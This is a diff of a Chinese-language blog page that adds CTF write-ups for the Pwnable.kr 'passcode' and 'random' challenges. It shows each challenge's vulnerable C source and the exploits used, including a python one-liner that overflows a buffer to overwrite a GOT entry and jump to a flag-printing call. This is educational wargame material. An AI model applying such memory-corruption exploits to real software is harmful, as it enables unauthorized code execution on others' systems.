@@ -110,7 +110,7 @@
 <meta property="og:description" content="fd连上去后查看源码 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;char buf[32];int main(int argc, char* argv[], char* envp[])&amp;#123;	if(argc&amp;lt;2)&amp;#123;		printf(&quot;pass argv[1] a numbe">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/CTF/Writeup/Pwnable/1.png">
-<meta property="og:updated_time" content="2017-08-31T13:37:24.547Z">
+<meta property="og:updated_time" content="2017-09-01T15:32:10.632Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pwnable.kr Writeup">
 <meta name="twitter:description" content="fd连上去后查看源码 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;char buf[32];int main(int argc, char* argv[], char* envp[])&amp;#123;	if(argc&amp;lt;2)&amp;#123;		printf(&quot;pass argv[1] a numbe">
@@ -329,8 +329,8 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2017-08-31T21:37:24+08:00">
-                2017-08-31
+              <time title="更新于" itemprop="dateModified" datetime="2017-09-01T23:32:10+08:00">
+                2017-09-01
               </time>
             
           </span>
@@ -462,6 +462,23 @@
 <h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>逆向题…</p>
 <p><code>upx -d flag -o out</code> 脱壳后,IDA 查看字符串</p>
 <p><img src="/CTF/Writeup/Pwnable/1.png" alt="1"></p>
+<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> passcode1;</div><div class="line">	<span class="keyword">int</span> passcode2;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</div><div class="line">	fflush(<span class="built_in">stdin</span>);</div><div class="line"></div><div class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</div><div class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</div><div class="line"></div><div class="line">	welcome();</div><div class="line">	login();</div><div class="line"></div><div class="line">	<span class="comment">// something after login...</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<div class="note info"><p>Points</p></div>
+<ul>
+<li>通过溢出控制<code>scanf(&quot;%d&quot;, passcode1);</code> 使得passcode1可控</li>
+<li>修改<code>printf</code> or <code>exit</code> 使其指向 0x080485e3</li>
+</ul>
+<div class="note success"><p>Exp</p></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root in ~/Desktop/tmp λ python -c "print 'A'*96 + '\x00\xa0\x04\x08' +'\n' + '134514147' + '\n' "|./passcode</div><div class="line">Toddler's Secure Login System 1.0 beta.</div><div class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</div><div class="line">/bin/cat: flag: No such file or directory</div><div class="line">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</div><div class="line">        random = rand();        <span class="comment">// random value!</span></div><div class="line"></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<div class="note info"><p>Points</p></div>
+<ul>
+<li>c中的rand函数产生的是伪随机数,每次产生出的是固定值</li>
+<li>dword   双字 就是四个字节</li>
+<li>ptr     pointer缩写 即指针</li>
+</ul>
+<div class="note success"><p>Exp</p></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">random@ubuntu:~$ ./random </div><div class="line">3039230856</div><div class="line">Good!</div><div class="line">Mommy, I thought libc random is unpredictable...</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -658,7 +675,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-text">bof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-text">flag</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-text">bof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-text">flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passcode"><span class="nav-text">passcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#random"><span class="nav-text">random</span></a></li></ol></div>
             
 
           </div>
@@ -698,7 +715,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共5.3k字</span>
+  <span class="post-count">博客全站共5.6k字</span>
 </div>
         
 
